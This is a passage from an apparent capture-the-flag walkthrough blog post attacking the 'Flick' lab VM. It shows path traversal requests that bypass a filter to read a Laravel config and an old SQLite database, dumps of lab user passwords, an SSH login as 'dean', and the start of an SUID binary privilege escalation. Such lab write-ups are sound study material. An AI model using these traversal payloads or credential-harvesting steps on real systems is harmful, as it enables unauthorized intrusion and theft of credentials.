</span><span class='line'>    <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;/VirtualHost&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our DocumentRoot is /var/www/flick_photos/public, so we now know our base path. Using the Laravel github repo as a directional aid, I found out the database config file is located in app/config/database.php, so</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//var/www/flick_photos/app/config/database.php
</span></code></pre></td></tr></table></div></figure>


<p>catting this image.jpg file does indeed show us credentials for MySQL, but there&rsquo;s something more interesting</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | PDO Fetch Style</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | By default, database results will be returned as instances of the PHP</span>
</span><span class='line'><span class="cm"> | stdClass object; however, you may desire to retrieve records in an</span>
</span><span class='line'><span class="cm"> | array format for simplicity. Here you can tweak the fetch style.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;fetch&#39;</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_CLASS</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Default Database Connection Name</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Here you may specify which of the database connections below you wish</span>
</span><span class='line'><span class="cm"> | to use as your default connection for all database work. Of course</span>
</span><span class='line'><span class="cm"> | you may use many connections at once using the Database library.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved</span>
</span><span class='line'>  <span class="c1">// on to the new and improved MySQL database. So, I will just comment out this as it is</span>
</span><span class='line'>  <span class="c1">// no longer in use</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//&#39;default&#39; =&gt; &#39;sqlite&#39;,</span>
</span><span class='line'>  <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Database Connections</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Here are each of the database connections setup for your application.</span>
</span><span class='line'><span class="cm"> | Of course, examples of configuring each database platform that is</span>
</span><span class='line'><span class="cm"> | supported by Laravel is shown below to make development simple.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | All database work in Laravel is done through the PHP PDO facilities</span>
</span><span class='line'><span class="cm"> | so make sure you have the driver for your particular database of</span>
</span><span class='line'><span class="cm"> | choice installed on your machine before you begin development.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;connections&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;sqlite&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;sqlite&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="nx">__DIR__</span><span class="o">.</span><span class="s1">&#39;/../database/production.sqlite&#39;</span><span class="p">,</span> <span class="c1">// OLD DATABASE NO LONGER IN USE!</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;mysql&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>      <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;flick&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;flick&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;resuddecNeydmar3&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;charset&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;collation&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;utf8_unicode_ci&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;pgsql&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;pgsql&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;forge&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;forge&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;charset&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;schema&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;public&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;sqlsrv&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;sqlsrv&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;database&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Migration Repository Table</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | This table keeps track of all the migrations that have already run for</span>
</span><span class='line'><span class="cm"> | your application. Using this information, we can determine which of</span>
</span><span class='line'><span class="cm"> | the migrations on disk haven&#39;t actually been run in the database.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;migrations&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;migrations&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Redis Databases</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Redis is an open source, fast, and advanced key-value store that also</span>
</span><span class='line'><span class="cm"> | provides a richer set of commands than a typical key-value systems</span>
</span><span class='line'><span class="cm"> | such as APC or Memcached. Laravel makes it easy to dig right in.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;redis&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;cluster&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;port&#39;</span>     <span class="o">=&gt;</span> <span class="mi">6379</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">),</span>
</span><span class='line'>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This line is what we need to be focusing on</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">database</span><span class="s1">&#39; =&gt; __DIR__.&#39;</span><span class="o">/../</span><span class="nx">database</span><span class="o">/</span><span class="nx">production</span><span class="o">.</span><span class="nx">sqlite</span><span class="err">&#39;</span><span class="p">,</span> <span class="c1">// OLD DATABASE NO LONGER IN USE!</span>
</span></code></pre></td></tr></table></div></figure>


<p>which would indicate that the app previously used SQLite, and switched to MySQL. There&rsquo;s a file I need to get my hands on !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//var/www/flick_photos/app/database/production.sqlite
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png" alt="flick_004" /></a></p>

<p>Yes !  Once I renamed the file and installed SQLite tools onto my Kali VM, I was able to wander around the database to get some username and password combos</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# mv image.jpg production.sqlite
</span><span class='line'>root@pwk:~# apt-get install sqlite
</span><span class='line'>Blah blah, install blah.
</span><span class='line'>root@pwk:~# sqlite production.sqlite
</span><span class='line'>SQLite version 2.8.17
</span><span class='line'>Enter <span class="s2">&quot;.help&quot;</span> <span class="k">for</span> instructions
</span><span class='line'>sqlite&gt; .databases
</span><span class='line'>seq  name             file
</span><span class='line'>---  ---------------  ----------------------------------------------------------
</span><span class='line'><span class="m">0</span>    main             /root/Downloads/production.sqlite
</span><span class='line'><span class="m">1</span>    temp             /var/tmp/sqlite_pUdaqDiGqjXzPPF
</span><span class='line'>sqlite&gt; .tables
</span><span class='line'>old_users
</span><span class='line'>sqlite&gt; .dump old_users
</span><span class='line'>BEGIN TRANSACTION<span class="p">;</span>
</span><span class='line'>CREATE TABLE old_users <span class="o">(</span>
</span><span class='line'>  username text,
</span><span class='line'>  password text
</span><span class='line'><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;paul&#39;</span>,<span class="s1">&#39;nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;robin&#39;</span>,<span class="s1">&#39;JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;james&#39;</span>,<span class="s1">&#39;scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>INSERT INTO old_users VALUES<span class="o">(</span><span class="s1">&#39;dean&#39;</span>,<span class="s1">&#39;FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>COMMIT<span class="p">;</span>
</span><span class='line'>sqlite&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh robin@192.168.0.106
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="s2">&quot;Y8  888 .8P&#39;</span>
</span><span class='line'><span class="s2"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s2"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s2">o888o   o888o o888o `Y8bod8P&#39; o888o o888o </span>
</span><span class='line'>
</span><span class='line'><span class="s2">robin@192.168.0.106&#39;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1</span>
</span><span class='line'><span class="s2">Permission denied, please try again.</span>
</span><span class='line'><span class="s2">robin@192.168.0.106&#39;s password: ^C</span>
</span><span class='line'><span class="s2">root@pwk:~# ssh dean@192.168.0.106</span>
</span><span class='line'>
</span><span class='line'><span class="s2"> .o88o. oooo   o8o            oooo</span>
</span><span class='line'><span class="s2"> 888 `&quot;</span> <span class="sb">`</span><span class="m">888</span>   <span class="sb">`</span><span class="s2">&quot;&#39;            `888</span>
</span><span class='line'><span class="s2">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s2"> 888     888  `888  d88&#39; `&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>dean@192.168.0.106<span class="s1">&#39;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA</span>
</span><span class='line'><span class="s1">Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</span>
</span><span class='line'>
</span><span class='line'><span class="s1"> * Documentation:  https://help.ubuntu.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System information as of Wed Aug 13 00:18:03 SAST 2014</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  System load:  0.0               Processes:              87</span>
</span><span class='line'><span class="s1">  Usage of /:   39.7% of 6.99GB   Users logged in:        0</span>
</span><span class='line'><span class="s1">  Memory usage: 49%               IP address for eth0:    192.168.0.106</span>
</span><span class='line'><span class="s1">  Swap usage:   1%                IP address for docker0: 172.17.42.1</span>
</span><span class='line'>
</span><span class='line'><span class="s1">  Graph this data and manage this system at:</span>
</span><span class='line'><span class="s1">    https://landscape.canonical.com/</span>
</span><span class='line'>
</span><span class='line'><span class="s1">79 packages can be updated.</span>
</span><span class='line'><span class="s1">51 updates are security updates.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">New release &#39;</span>14.04.1 LTS<span class="s1">&#39; available.</span>
</span><span class='line'><span class="s1">Run &#39;</span><span class="k">do</span>-release-upgrade<span class="err">&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:16:41 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, we&rsquo;re in. Let the fun continue.</p>

<hr />

<h2>Dean Covers While Robin&rsquo;s on Holiday</h2>

<p>Dean&rsquo;s home folder includes two files - a message text file and a binary called read_docker with the SUID bit set as the robin user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 16
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  root  <span class="m">1250</span> Aug  <span class="m">4</span> 12:56 message.txt
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> robin robin <span class="m">8987</span> Aug  <span class="m">4</span> 14:45 read_docker
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>The message file tells us that Robin is away on holiday, and that the admin guys will allow Dean access to his dockerfile in his home directory.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----BEGIN PGP SIGNED MESSAGE-----
</span><span class='line'>Hash: SHA1
</span><span class='line'>
</span><span class='line'>Hi Dean,
</span><span class='line'>
</span><span class='line'>I will be away on leave for the next few weeks. I have asked the admin guys to
</span><span class='line'>write a quick script that will allow you to read my .dockerfile for flick-
</span><span class='line'>a-photo so that you can continue working in my absense.
</span><span class='line'>
</span><span class='line'>The .dockerfile is in my home, so the path for the script will be something like
</span><span class='line'>/home/robin/flick-dev/
</span><span class='line'>
</span><span class='line'>Please call me if you have any troubles!
</span><span class='line'>
</span><span class='line'>- --
</span><span class='line'>Ciao
</span><span class='line'>Robin
</span><span class='line'>-----BEGIN PGP SIGNATURE-----
</span><span class='line'>Version: GnuPG v1
</span><span class='line'>
</span><span class='line'>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
</span><span class='line'>yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
</span><span class='line'>ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
</span><span class='line'>enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
</span><span class='line'>9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
</span><span class='line'>jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
</span><span class='line'>AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
</span><span class='line'>0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
</span><span class='line'>lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
</span><span class='line'>q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
</span><span class='line'>Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
</span><span class='line'>nZAuFXkGFu6cMMD4rDXQ
</span><span class='line'>=2moZ
</span><span class='line'>-----END PGP SIGNATURE-----
</span></code></pre></td></tr></table></div></figure>


<p>Looks like they tried to be clever and made the binary instead. So, what does this binary do ? It seems to just read any file called &ldquo;dockerfile&rdquo; from the directory you provide.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker /home/robin
</span><span class='line'>ERROR: the specified docker file doesn<span class="err">&#39;</span>t exist: /home/robin/Dockerfile
</span><span class='line'>Usage is: ./read_docker /path/to/dockerfile
</span><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker /home/robin/flick-dev
</span><span class='line'><span class="c"># Flick-a-photo dev env</span>
